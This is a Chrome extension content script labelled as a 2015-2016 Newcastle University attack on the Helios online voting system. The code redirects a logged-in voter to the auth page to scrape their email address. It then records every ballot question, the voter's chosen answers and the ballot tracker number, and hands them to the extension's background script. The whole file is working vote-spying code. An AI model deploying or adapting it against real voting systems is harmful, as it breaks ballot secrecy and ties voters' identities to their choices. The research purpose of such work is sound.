// Author: Milton Li 2015-2016, Newcastle University
// Project: Attack on Helios voting system

var questions = [];
var answers = []

$(document).ready(function() {
  
  var url = $(location).attr('href');
  
  // The URL ends with '#', i.e. the page after the user logins
  if (url.lastIndexOf("#") === (url.length - "#".length)) {
    // Save the current URL user is browsing
    chrome.runtime.sendMessage({type: "setBaseUrl", baseUrl: url});
    
    // Redirect to the URL to read user's email address
    var authUrl = url.replace(".io/", ".io/auth/?return_url=/").replace("#", "");
    window.location.href = authUrl;
  }
  // The page redirected by the code above to read user's email
  else if (url.search("/auth/") !== -1) {
    // Save user's email address
    var emailAddress = $(".row > p > b:first").text();
    chrome.runtime.sendMessage({type: "setUserEmailAddress", emailAddress: emailAddress});
    
    chrome.runtime.sendMessage({type: "getBaseUrl"}, function(response) {
      var baseUrl = JSON.parse(response.baseUrl);
      window.location.href = baseUrl.replace("#", "");
    });
  }
  
  // Save the first question when the user clicks the start button
  $(document).on("click", ':button:contains("Start")', function() {
    questions[0] = $("#answer_form > p > b").text();
  });
  
  // Save the answer selected by the user on the check box
  $(document).on("click", ".ballot_answer", function() {
    var index = $("input[name='question_num']").val();
    var answer = $("#" + this.id)[0].nextSibling.nodeValue;
    answers[index] = answer;
  });
  
  // Save the questions from question two when the user clicks the next button
  $(document).on('click', ':button[value="Next"]', function() {
    var index = $("input[name='question_num']").val();
    questions[index] = $('#answer_form > p > b').text();
  });
  
  // Save all the questions and answers when the user clicks the proceed button
  $(document).on('click', ':button[value="Proceed"]', function() {
    chrome.runtime.sendMessage(
      {
        type: "setSelectedOption",
        questions: questions,
        answers: answers
      }
    );
  });
  
  // Save smart ballot tracker number
  if ($("#contentbody > p > tt").length) {
    chrome.runtime.sendMessage({
      type: "setBallotTrackerNumber",
      trackerNumber: $("#contentbody > p > tt").text()
    });
  }
});